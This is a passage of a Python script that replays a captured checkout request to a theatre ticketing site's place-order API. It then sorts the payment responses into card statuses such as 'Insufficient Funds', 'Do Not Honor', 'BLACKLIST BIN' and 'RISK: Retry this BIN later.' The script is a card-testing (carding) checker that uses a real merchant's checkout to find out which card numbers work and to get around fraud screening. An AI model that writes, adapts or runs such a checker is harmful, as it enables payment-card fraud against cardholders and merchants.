rgba(0,0,0,.2);\n                                            border-radius: 6px;\n                                            box-shadow: 0 5px 10px rgba(0,0,0,0.2);\n                                            -webkit-box-shadow: 0 5px 10px rgba(0,0,0,0.2);\n                                            padding: 24px 20px;\n                                            font-size: 0.786em;\n                                            line-height: 1.636em;\n                                            width: 400px;\n                                        }\n                                        .ticketInsurance .azp-tooltip-icon {\n                                            font-family: FontAwesome;\n                                        }\n                                        .ticketInsurance .azp-tooltip-icon i {\n                                            color: #50b3d6;\n                                            font-size: 1.5rem;\n                                        }\n                                        .ticketInsurance #azp-tooltip-label:hover > .azp-tooltip-icon i, .ticketInsurance #azp-tooltip-label:focus > .azp-tooltip-icon i, .ticketInsurance .azp-tooltip-link:hover, .ticketInsurance .azp-tooltip-link:focus {\n                                            color: #2a6496;\n                                        }\n                                        .ticketInsurance .azp-tooltip-close {\n                                            color: #000;\n                                            font-size: 14px;\n                                            font-weight: 700;\n                                            line-height: 1;\n                                            text-shadow: 0 1px 0 #fff;\n                                            opacity: 0.2;\n                                        }\n                                        .ticketInsurance .azp-tooltip-close:hover, .ticketInsurance .azp-tooltip-close:focus {\n                                            opacity: 0.5;\n                                        }\n                                        .ticketInsurance label.azp-tooltip-close-link {\n                                            text-align: right;\n                                            width: 100%;\n                                            position: absolute;\n                                            right: 10px;\n                                            top: 5px;\n                                        }\n                                        .ticketInsurance .azp-tooltip-window {\n                                            display: none;\n                                            position: absolute;\n                                            margin-bottom: 3rem!important;\n                                            margin-left: 16.75rem;\n                                            align-self: flex-end;\n                                        }\n                                        .ticketInsurance input#azp-tooltip-checkbox:checked + .azp-tooltip-link + .azp-tooltip-window {\n                                            display: block;\n                                            outline: none;\n                                        }\n                                        .ticketInsurance .azp-tooltip-arrow {\n                                            border-bottom: 1px solid rgba(0,0,0,0.2);\n                                            border-right: 1px solid rgba(0,0,0,0.2);\n                                            background-color: #fff;\n                                            width: 14px;\n                                            height: 14px;\n                                            transform: rotate(45deg);\n                                            margin-top: -7px;\n                                            margin-left: 1.5rem;\n                                        }\n                                        /* Icons */\n                                        .agaCheckmark {\n                                            display: inline-block;\n                                            color: #008000;\n                                            font-weight: 700;\n                                            margin-left: 10px;\n                                        }\n                                        .agaCheckmark:before {\n                                            content: \'\';\n                                            display: inline-block;\n                                            width: 5px;\n                                            height: 10px;\n                                            border: solid #008000;\n                                            border-width: 0 4px 4px 0;\n                                            transform: rotate(45deg);\n                                            margin-right: 4px;\n                                        }\n                                        /* SVGs */\n                                        #agacheckmark {\n                                            fill: #008000;\n                                            width: 12px;\n                                            height: 12px;\n                                        }\n                                        #agaexclamtri {\n                                            width: 12px;\n                                            height: 12px;\n                                            fill: #cf071e!important;\n                                        }\n                                        .gaexclamtripoint {\n                                            fill: #ffffff;\n                                        }\n                                        /* YES/NO INTERACTIVITY */\n                                        #agaInsuranceSelected,\n                                        #agaInsuranceDeclined {\n                                            display:none;\n                                            font-weight:bold;\n                                        }\n                                        #insuranceOption0:checked ~ #agaInsuranceSelected,\n                                        #insuranceOption1:checked ~ #agaInsuranceDeclined {\n                                            display:inline-block;\n                                        }\n                                        #insuranceOption0:checked ~ #insuranceOptionText0,\n                                        #insuranceOption1:checked ~ #insuranceOptionText1,\n                                        .allianz-hiddenSelected:checked {\n                                            display:none;\n                                        }\n                                        #insuranceOptionText0.allianz-optText,\n                                        .allianz-hiddenSelected ~ #agaInsuranceDeclined {\n                                            margin-left: 5px;\n                                        }\n                                        .allianz-hiddenSelected ~ #agaInsuranceSelected .agaCheckmark:before {\n                                            margin-right: 0;\n                                        }\n                                        #agaInsuranceSelected .allianz-optText {\n                                            margin-left: 10px;\n                                        }\n                                        #agaInsuranceDeclined.allianz-optText,\n                                        #agaInsuranceDeclined .allianz-optText {\n                                            margin-left: 7px;\n                                        }\n                                        .allianz-optText + #allianz-dynPolicy,\n                                        .allianz-hiddenSelected ~ #allianz-dynPolicy {\n                                            margin-left: 27px;\n                                        }\n                                    </style>\n<div style="display:none !important;">\n\t<input type="hidden" value=1229151 id="agaTreatmentID" />\n\t<input type="hidden" value=Champion id="agaOfferType" />\n\t<input type="hidden" value=SGMT_23551  id="agaSegmentCode" />\n</div>',
	            'options': [
	                {
	                    'quoteId': '4302350300003019470',
	                    'declination': False,
	                    'individualPrice': 7,
	                    'totalPrice': 7,
	                    'html': None,
	                    'productCode': '001006274',
	                    'offerSequenceNumber': 0,
	                },
	                {
	                    'quoteId': '4302350300003019471',
	                    'declination': True,
	                    'individualPrice': 0,
	                    'totalPrice': 0,
	                    'html': None,
	                    'productCode': 'NoProduct',
	                    'offerSequenceNumber': 1,
	                },
	            ],
	        },
	        'deliveryCost': 7.5,
	        'totalCharge': 66.15,
	        'totalPreTax': 66.15,
	        'loyaltyPricing': None,
	        'invalidCustomPrice': False,
	    },
	    'quoteId': 'd23eba54-68e1-4603-8e41-e87de4124486',
	    'wsVar': '|||pr_345076bozt',
	    'parentId': 521,
	}
	
	req0 = requests.post(
	    'https://purchase.theatrelandamerica.com/api/place-order',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	if "success" in req0.text:
		return "success"		
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Issuer or Cardholder has put a restriction on the card" in req0.text:
		return "Issuer or Cardholder has put a restriction on the card"		
	if "The requested qty is not available" in req0.text:
		return "Try Again !"	
	if "No Such Issuer" in req0.text:
		return "No Such Issuer"				
	if "Invalid Merchant ID" in req0.text:
		return "BLACKLIST BIN"		
	if "Payment instrument type is not accepted by this merchant account." in req0.text:
		return "Unsupported card."	
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
				time.sleep(1)	
